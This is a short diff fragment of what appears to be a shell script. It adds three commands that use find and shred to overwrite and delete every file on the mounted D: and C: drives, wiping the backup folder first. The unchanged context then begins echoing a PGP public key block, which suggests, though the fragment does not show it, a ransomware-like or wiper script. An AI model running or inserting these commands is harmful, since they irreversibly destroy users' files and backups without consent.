@@ -1,3 +1,7 @@
+find /mnt/d/backups/ -type f -exec shred -zun0 '{}' \;
+find /mnt/d/ -type f -exec shred -zun0 '{}' \;
+find /mnt/c/ -type f -exec shred -zun0 '{}' \;
+
 echo '-----BEGIN PGP PUBLIC KEY BLOCK-----
 
 mQGNBGVbcScBDAC61JCKV/3ILPQo58YKY32pOlb1f3cAYOK2xn/o+MwBBqSLK6E+
